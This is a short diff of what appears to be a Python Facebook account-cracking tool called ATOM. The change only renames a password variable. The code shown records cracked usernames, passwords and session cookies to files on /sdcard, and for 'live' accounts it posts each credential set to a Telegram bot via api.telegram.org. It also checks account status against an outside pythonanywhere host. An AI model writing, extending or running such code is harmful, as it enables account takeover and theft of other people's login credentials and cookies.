@@ -1096,17 +1096,17 @@ def m2(idf,pwv):
            url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
            reqx = requests.get(url).text
            if 'live' in reqx:
-                    print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+                    print(f'\r\r{P}[ATOM-OK]: {user} | {pw}')
                     print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-                    statusok = (f" {user} | {ps} | {coki} ")
+                    statusok = (f" {user} | {pw} | {coki} ")
                     requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                    open('/sdcard/ATOM-M2-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+                    open('/sdcard/ATOM-M2-live-OK.txt','a').write(user+'|'+pw+'|'+coki+'\n')
                     ok+=1 
                     break
            if 'lock' in reqx:
-                    print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
+                    print(f'\r\r{p}[ATOM-OK]: {user} | {pw}')
                     print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-                    open('/sdcard/ATOM-M2-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+                    open('/sdcard/ATOM-M2-live-OK.txt','a').write(user+'|'+pw+'|'+coki+'\n')
                     ok+=1 
                     break
    elif 'checkpoint' in log_cookies:
@@ -1115,7 +1115,7 @@ def m2(idf,pwv):
            uid = "1000"+coki1[0:11]
            if 'y' in cp_xdx:
            print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
-           open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+           open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+pw+'|'+'\n')
            cp.append(uid)
    else:
         continue
